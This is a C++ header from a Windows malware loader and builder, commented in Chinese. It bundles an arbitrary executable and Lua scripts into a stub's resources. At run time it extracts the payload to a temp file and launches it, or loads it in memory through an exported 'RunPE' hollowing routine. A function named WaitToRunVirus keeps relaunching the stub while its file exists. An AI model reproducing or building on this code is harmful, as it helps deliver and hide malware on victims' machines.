#pragma once
#include "resource.h"

#include "MemoryModule.h"
#include "LuaFunc.h"
// #include "ProcessHollowing.h"

#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>

#include <atlstr.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "../../include/lua/lua.hpp"

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "lua.lib")

// 原函数指针
typedef HRSRC(WINAPI* FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
typedef HGLOBAL(WINAPI* LoadResource_t)(HMODULE hModule, HRSRC hResInfo);

extern HMEMORYMODULE g_mem_pe;
extern FindResource_t OriginalFindResource;
extern LoadResource_t OriginalLoadResource;

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
bool update_file(CString src_path, CString dst_path, int rid);
bool update_resource(CString str_path, HANDLE hUpdate, int rid);
bool update_config(int config, HANDLE hUpdate, int rid);
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path = L"", int config = 0);

// 枚举资源类型的回调函数
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path = L"", int config = 0);


// 定义一个函数指针类型，与 DLL 中的导出函数签名匹配
typedef int (*RunPEFunc)(int);
// typedef int (*RunPEFunc)(void*, DWORD);

// 将资源添加到新文件的结构体
struct ResourceUpdateData {
    HANDLE hUpdate;
};

struct ResourceUpdateData32 {
    HANDLE hUpdate;
};

// 自定义结构体，模仿 IMAGE_RESOURCE_DATA_ENTRY
typedef struct {
    DWORD OffsetToData;  // 资源数据的偏移
    DWORD Size;          // 资源数据的大小
} RESOURCE_ENTRY, * PRESOURCE_ENTRY;

struct SharedData {
    DWORD pidC; // 存储进程C的PID
};

class SharedMemory {
public:
    SharedMemory() : hMapping(nullptr), pSharedData(nullptr) {
        // 创建或打开共享内存
        hMapping = CreateFileMapping(
            INVALID_HANDLE_VALUE,  // 使用系统页面文件
            NULL,                  // 默认安全性
            PAGE_READWRITE,        // 读写权限
            0,                      // 高位（只能为零）
            sizeof(SharedData),    // 映射大小
            L"VgenSharedMemory" // 共享内存名称
        );

        if (hMapping == NULL) {
            OutputDebugStringA("[vgen] CreateFileMapping failed!\n");
            return;
        }

        // 映射共享内存
        pSharedData = (SharedData*)MapViewOfFile(
            hMapping,               // 共享内存句柄
            FILE_MAP_ALL_ACCESS,    // 访问权限
            0,                      // 文件映射起始位置（低位）
            0,                      // 文件映射起始位置（高位）
            sizeof(SharedData)      // 映射区域的大小
        );

        if (pSharedData == NULL) {
            OutputDebugStringA("[vgen] MapViewOfFile failed!\n");
            CloseHandle(hMapping);
            return;
        }
    }

    ~SharedMemory() {
        // 清理
        if (pSharedData != NULL) {
            UnmapViewOfFile(pSharedData);
        }
        if (hMapping != NULL) {
            CloseHandle(hMapping);
        }
    }

    // 写入进程C的PID到共享内存
    void WritePid(DWORD pid) {
        if (pSharedData != nullptr) {
            pSharedData->pidC = pid;
            CStringA str_msg;
            str_msg.Format("[vgen] Written PID to shared memory: %d\n", pid);
            OutputDebugStringA(str_msg);
        }
    }

    // 读取共享内存中的进程C的PID
    DWORD ReadPid() {
        if (pSharedData != nullptr) {
            CStringA str_msg;
            str_msg.Format("[vgen] Read PID from shared memory:  %d\n", pSharedData->pidC);
            OutputDebugStringA(str_msg);
            return pSharedData->pidC;
        }
        return 0;
    }

private:
    HANDLE hMapping;
    SharedData* pSharedData;
};

class CPEGenerator
{
public:
	CPEGenerator()
        : ph(NULL)
        , pRunPE(NULL)
    {

	}
	~CPEGenerator() {

        if (ph) {
            MemoryFreeLibrary(ph);
        }

	}

public:

    // 宽字符转换为窄字符
    bool WChar2Ansi(const wchar_t* pwszSrc, char*& pszDst)
    {
        bool flag = false;
        size_t len = 0;
        size_t trans_len = (wcslen(pwszSrc) * 2) + 1;

        pszDst = new char[trans_len];
        errno_t err = wcstombs_s(&len, pszDst, trans_len, pwszSrc, trans_len);

        if (len > 0) {
            flag = true;
        }
        else {
            delete[] pszDst;
            pszDst = nullptr;
        }
        return flag;
    }

    void ParseParams(int argc, wchar_t* argv[]);
//    void ParseParams(int argc, wchar_t* argv[]) {
//        if (argc <= 1) {
//            WaitToRunVirus();
//            // MemoryLoadToRun(IDR_BINARY_FILE);
//            // MemoryLoadToRun(IDR_BINARY_FILE);
//            //pRunPE(IDR_BINARY_FILE);
//        }
//        else if (argc == 2) {
//            CString str_param = argv[1];
//            if (str_param == L"run") {
//                
//                // MemoryLoadToRun(IDR_BINARY_FILE);
//                MemLoadDll();
//
//                int cnt = 10;
//                int pid = -1;
//                int config = ExtractLuaGetCfg(IDR_CFG);
//                while (cnt-- && pid == -1) {
//                    if (config) {
//                        pid = pRunPE(IDR_BINARY_FILE);
//                    }
//                    else {
//                        ExtractAndRunResourceProgram(IDR_BINARY_FILE, str_temp_path, pid);
//                    }
//                    Sleep(1000);
//                }
//
//              
//                SharedMemory share;
//                share.WritePid(pid);
//
//
//
//                //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
//                //if (!hMainThread) {
//                //    return;
//                //}
//
//                //// 创建辅助线程执行 Hollowing
//                //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
//                //if (!hThread) {
//                //    CloseHandle(hMainThread);
//                //    return;
//                //}
//
//                //// 等待辅助线程完成
//                //WaitForSingleObject(hThread, INFINITE);
//                //CloseHandle(hThread);
//                //CloseHandle(hMainThread);
//
//            }
//            else if (str_param == L"wait") {
//                return;
//            }
//            
//        }
//        else if(argc >= 3) {
//
//            CString str_param = argv[1];
//            if (str_param == L"runlua") {
//                char* str_file;
//                CStringHandler::InitChinese();
//                CStringHandler::WChar2Ansi(argv[2], str_file);
//                if (str_file) {
//                    LuaRunner runner;
//                    runner.run_lua_file(str_file);
//                    delete[] str_file;
//                }
//                else {
//                    OutputDebugStringA("trans file data to char failed .");
//                }
//                return;
//            }
//
//            WCHAR exePath[MAX_PATH];
//            // 获取当前程序的路径
//            DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
//            LPCWSTR resourceFilePath = argv[1];
//            LPCWSTR newExePath = argv[2];
//            CString lua_path;
//            int config = 0;
//            if (argc >= 4) {
//                lua_path = argv[3];
//            }
//            if (argc >= 5) {
//                config = 1;
//            }
//#ifdef _WIN64
//            AddFileToResource(exePath, resourceFilePath, newExePath, lua_path, config);
//#else
//            AddFileToResource32(exePath, resourceFilePath, newExePath, lua_path, config);
//#endif
//        }
//    }   

    //BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
    //    WCHAR tempFilePath[MAX_PATH];

    //    // 创建临时文件路径
    //    GetTempPath(MAX_PATH, tempFilePath);
    //    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    //    // 将当前可执行文件复制到临时文件
    //    if (!CopyFile(exePath, tempFilePath, FALSE)) {
    //        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
    //        return FALSE;
    //    }

    //    // 打开临时文件进行资源更新
    //    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    //    if (!hUpdate) {
    //        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    // 打开要添加到资源的文件
    //    std::ifstream file(resourceFilePath, std::ios::binary);
    //    if (!file.is_open()) {
    //        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
    //        EndUpdateResource(hUpdate, TRUE);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    // 读取文件内容到内存
    //    file.seekg(0, std::ios::end);
    //    size_t fileSize = file.tellg();
    //    file.seekg(0, std::ios::beg);

    //    char* buffer = new char[fileSize];
    //    file.read(buffer, fileSize);
    //    file.close();

    //    // 将文件内容更新到资源中
    //    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
    //        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
    //        delete[] buffer;
    //        EndUpdateResource(hUpdate, TRUE);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    delete[] buffer;

    //    // 完成资源更新
    //    if (!EndUpdateResource(hUpdate, FALSE)) {
    //        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    // 将修改后的临时文件复制到目标文件路径
    //    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
    //        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // 删除临时文件
    //        return FALSE;
    //    }

    //    // 删除临时文件
    //    DeleteFile(tempFilePath);

    //    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    //    return TRUE;
    //}
    BOOL TerminateProcessByPid(DWORD pid) {
        // 打开目标进程，具有 TERMINATE 权限
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);

        if (hProcess == NULL) {
            // 打开进程失败，输出错误信息到调试器
            char msg[256];
            snprintf(msg, sizeof(msg), "OpenProcess failed with error code: %lu", GetLastError());
            OutputDebugStringA(msg);
            return FALSE;
        }

        // 终止进程，退出代码为 0
        BOOL result = TerminateProcess(hProcess, 0);  // 第二个参数是退出代码，通常设置为 0

        if (!result) {
            // 如果终止失败，输出错误信息到调试器
            char msg[256];
            snprintf(msg, sizeof(msg), "TerminateProcess failed with error code: %lu", GetLastError());
            OutputDebugStringA(msg);
        }
        else {
            // 输出成功信息到调试器
            char msg[256];
            snprintf(msg, sizeof(msg), "Process %lu terminated successfully.", pid);
            OutputDebugStringA(msg);
        }

        // 关闭进程句柄
        CloseHandle(hProcess);

        return result;
    }


    // 获取资源大小
    DWORD GetRecSize(int resourceId) {
        DWORD resourceSize = 0;
        HMODULE hModule = GetModuleHandle(NULL);
        if (hModule) {
            // 查找指定资源
            HRSRC hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
            if (hResInfo != NULL) {
                // 获取资源的大小
                resourceSize = SizeofResource(hModule, hResInfo);
            }
        }
        return resourceSize;
    }

    // 获取当前进程的资源段基地址
    IMAGE_RESOURCE_DIRECTORY* GetCurrentProcessResourceDirectory() {
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) return nullptr;

        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

        DWORD resourceRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
        if (resourceRVA == 0) return nullptr;

        return (IMAGE_RESOURCE_DIRECTORY*)((BYTE*)hModule + resourceRVA);
    }

    void RedirectResourceDirectory(HMEMORYMODULE loadedModule, IMAGE_RESOURCE_DIRECTORY* newResourceDir) {
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)loadedModule;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)loadedModule + dosHeader->e_lfanew);

        // 修改资源目录的 RVA 和大小指向当前进程的资源段
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = (DWORD)((BYTE*)newResourceDir - (BYTE*)loadedModule);
    }

    HANDLE RunGenerator(CString cmdline) {
        BOOL flag = FALSE;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // 使用 CreateProcess 运行自身
        flag = CreateProcess(
            NULL,                       // 应用程序名称
            cmdline.GetBuffer(),            // 命令行
            NULL,                       // 进程安全性属性
            NULL,                       // 线程安全性属性
            FALSE,                      // 是否继承句柄
            0,                          // 创建标志
            NULL,                       // 环境变量
            NULL,                       // 当前目录
            &si,                        // 启动信息
            &pi                         // 进程信息
        );
        cmdline.ReleaseBuffer();

        if (flag) {
            CStringA str_msg;
            str_msg.Format("成功启动自身，进程ID：%d", pi.dwProcessId);
            OutputDebugStringA(str_msg);
            // 关闭进程和线程句柄
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            OutputDebugStringA("退出");
        }

        return pi.hProcess;
    }

    // 获取当前进程的路径
    std::wstring GetCurrentProcessPath() {
        wchar_t path[MAX_PATH];
        if (GetModuleFileName(NULL, path, MAX_PATH)) {
            return std::wstring(path);
        }
        return L"";
    }

    // 关闭与当前进程启动路径相同的所有进程
    void TerminateMatchingProcesses() {
        OutputDebugStringA("TerminateMatchingProcesses my gen\n");

        CStringA str_msg;
        // 获取当前进程路径
        std::wstring currentProcessPath = GetCurrentProcessPath();

        // 获取当前进程ID
        DWORD currentProcessId = GetCurrentProcessId();

        // 创建进程快照
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            str_msg.Format("CreateToolhelp32Snapshot failed! error : %d\n", GetLastError());
            OutputDebugStringA(str_msg);
            return;
        }

        // 枚举进程
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hSnapshot, &pe32)) {
            str_msg.Format("Process32First failed! error : %d\n", GetLastError());
            OutputDebugStringA(str_msg);
            CloseHandle(hSnapshot);
            return;
        }

        do {
            // 跳过当前进程
            if (pe32.th32ProcessID == currentProcessId) {
                continue;
            }

            // 获取进程路径
            TCHAR szProcessPath[MAX_PATH];
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                if (GetModuleFileNameEx(hProcess, NULL, szProcessPath, MAX_PATH)) {
                    std::wstring processPath(szProcessPath);

                    // 如果进程路径与当前进程路径匹配，终止进程
                    if (processPath == currentProcessPath) {
                        
                        str_msg.Format("Terminating process: (PID: %d)\n", pe32.th32ProcessID);
                        OutputDebugStringA(str_msg);
                        TerminateProcess(hProcess, 0);
                    }
                }
                CloseHandle(hProcess);
            }
        } while (Process32Next(hSnapshot, &pe32));

        CloseHandle(hSnapshot);
    }

    BOOL WaitToRunVirus() {
        SharedMemory share;

        // 获取当前程序的完整路径
        wchar_t modulePath[MAX_PATH];
        GetModuleFileName(NULL, modulePath, MAX_PATH);

        // 构造命令行参数，包含程序路径和参数
        CString commandLine;
        commandLine.Format(L"\"%s\" wait", modulePath); // 注意引号包裹路径
        // commandLine.Format(L"\"%s\"", modulePath); // 注意引号包裹路径

        // 先启动病毒先
        CString run_vir;
        run_vir.Format(L"\"%s\" run", modulePath); // 注意引号包裹路径
        RunGenerator(run_vir);

        OutputDebugString(L"run lua script start !");

        // 先根据需求运行脚本，防止反复运行，如果要循环在脚本里实现就好
        ExtractLuaAndRun(IDR_LUA);

        OutputDebugString(L"run lua script end !");

        while (FileExists(modulePath)) {

            // 设置启动信息和进程信息结构体
            RunGenerator(commandLine);
            Sleep(10000);
        }
        OutputDebugStringA("[gen] file is not exit\n");
        
        // TerminateProcessByPid(share.ReadPid());
        TerminateProcessByPid(share.ReadPid());
        TerminateMatchingProcesses();

        return TRUE;
    }

    BOOL MemLoadDll() {
        BOOL flag = FALSE;
        try {
            // 加载当前模块
            HMODULE hModule = GetModuleHandle(NULL);
            if (!hModule) {
                // L"Failed to load module.\n";
                return flag;
            }

            // 查找资源
            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_PH), RT_RCDATA);
            if (!hResource) {
                //<< L"Failed to find resource.\n";
                return flag;
            }

            // 加载资源
            HGLOBAL hResData = LoadResource(hModule, hResource);
            if (!hResData) {
                // << L"Failed to load resource.\n";
                return flag;
            }

            // 获取资源大小和数据指针
            DWORD dataSize = SizeofResource(hModule, hResource);
            void* pData = LockResource(hResData);

            // 2. 使用 MemoryLoadLibrary 将 EXE 加载到内存
            ph = MemoryLoadLibrary(pData, dataSize);

            if (!ph) {
                std::cout << "Failed to load EXE into memory." << std::endl;
                return flag;
            }

            pRunPE = (RunPEFunc)MemoryGetProcAddress(ph, "RunPE");

            //// 假设已加载 DLL，得到其句柄
            //HMODULE hDll = LoadLibraryA("PhDll.dll");

            //MessageBox(NULL, L"test", L"test", MB_OK);
            //// 使用 GetProcAddress 获取 RunPE 函数的地址
            //RunPEFunc pRunPE = (RunPEFunc)GetProcAddress(hDll, "RunPE");

            // pRunPE = (RunPEFunc)MemoryGetProcAddress(ph, "RunPE");
        }
        catch (const std::exception& e) {
            std::cout << "Error: " << e.what() << std::endl;
            return flag;
        }
        return flag;
    }

    BOOL MemoryLoadToRun(int resourceId) {
        BOOL flag = FALSE;
        try {
            // 加载当前模块
            HMODULE hModule = GetModuleHandle(NULL);
            if (!hModule) {
                // L"Failed to load module.\n";
                return flag;
            }

            // 查找资源
            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
            if (!hResource) {
                // L"Failed to find resource.\n";
                return flag;
            }

            // 加载资源
            HGLOBAL hResData = LoadResource(hModule, hResource);
            if (!hResData) {
                // L"Failed to load resource.\n";
                return flag;
            }

            // 获取资源大小和数据指针
            DWORD dataSize = SizeofResource(hModule, hResource);
            void* pData = LockResource(hResData);

            // pRunPE(pData, dataSize);

            // 2. 使用 MemoryLoadLibrary 将 EXE 加载到内存
            /*HMEMORYMODULE hmemModule = MemoryLoadLibrary(pData, dataSize);
            if (!hmemModule) {
                std::cout << "Failed to load EXE into memory." << std::endl;
                return flag;
            }*/

            // 获取当前进程的资源目录地址
            //IMAGE_RESOURCE_DIRECTORY* currentResourceDir = GetCurrentProcessResourceDirectory();
            //if (currentResourceDir) {
            //    // 重定向内存加载 EXE 的资源目录指针
            //    RedirectResourceDirectory(hmemModule, currentResourceDir);
            //}
            //else {
            //    std::cerr << "Failed to locate current process resource directory." << std::endl;
            //}
            
            

            // 3. 获取 EXE 文件的入口点并调用
            // MemoryCallEntryPoint(hmemModule);

            // 4. 卸载 EXE 文件
            // MemoryFreeLibrary(hmemModule);
        }
        catch (const std::exception& e) {
            std::cout << "Error: " << e.what() << std::endl;
            return flag;
        }
        return flag;
    }

    bool FileExists(CString filePath) {
        DWORD fileAttr = GetFileAttributes(filePath);
        // 如果返回值为 INVALID_FILE_ATTRIBUTES，表示文件不存在或出错
        return (fileAttr != INVALID_FILE_ATTRIBUTES && !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
    }

    BOOL ExtractAndRunResourceProgram(int resourceId, CString& str_path, int& pid) {
        // 加载当前模块
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            // L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // 查找资源
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            // L"Failed to find resource.\n";
            return FALSE;
        }

        // 加载资源
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            // << L"Failed to load resource.\n";
            return FALSE;
        }

        // 获取资源大小和数据指针
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        // 将资源数据写入临时文件
        WCHAR tempPath[MAX_PATH];
        WCHAR tempFile[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        GetTempFileName(tempPath, L"tmp", 0, tempFile);

        std::ofstream outFile(tempFile, std::ios::binary);
        if (!outFile.is_open()) {
            // << L"Failed to create temp file.\n";
            return FALSE;
        }
        outFile.write((char*)pData, dataSize);
        outFile.close();

        // 创建一个进程运行提取的程序
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcess(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            // L"Failed to run the extracted program.\n;
            DeleteFile(tempFile); // 删除临时文件
            return FALSE;
        }

        // 等待程序结束
        // WaitForSingleObject(pi.hProcess, INFINITE);
        str_path = tempFile;
        pid = pi.dwProcessId;


        // 清理
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        // DeleteFile(tempFile); // 删除临时文件

        // std::wcout << L"Program executed successfully.\n";
        return TRUE;
    }

    // 提取并运行lua脚本
    BOOL ExtractLuaAndRun(int resourceId) {
        // 加载当前模块
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            // L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // 查找资源
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            // L"Failed to find resource.\n";
            return FALSE;
        }

        // 加载资源
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            // << L"Failed to load resource.\n";
            return FALSE;
        }

        // 获取资源大小和数据指针
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        LuaRunner runner;
        size_t lua_len = (size_t)dataSize + 1;
        char* lua_str = new char[lua_len];
        memset(lua_str, 0, sizeof(char) * (lua_len));
        memcpy(lua_str, pData, dataSize);

        runner.run_lua(lua_str);

        delete[] lua_str;

        // std::wcout << L"Program executed successfully.\n";
        return TRUE;
    }

    // 提取并运行lua脚本
    int ExtractLuaGetCfg(int resourceId) {
        // 加载当前模块
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            // L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // 查找资源
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            // L"Failed to find resource.\n";
            return FALSE;
        }

        // 加载资源
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            // << L"Failed to load resource.\n";
            return FALSE;
        }

        // 获取资源大小和数据指针
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        LuaRunner runner;
        size_t lua_len = (size_t)dataSize + 1;
        char* lua_str = new char[lua_len];
        memset(lua_str, 0, sizeof(char) * (lua_len));
        memcpy(lua_str, pData, dataSize);

        int cfg = runner.get_lua_cfg(lua_str);

        delete[] lua_str;

        // std::wcout << L"Program executed successfully.\n";
        return cfg;
    }

private:
    RunPEFunc pRunPE;
    HMEMORYMODULE ph;
    CString str_temp_path;

};
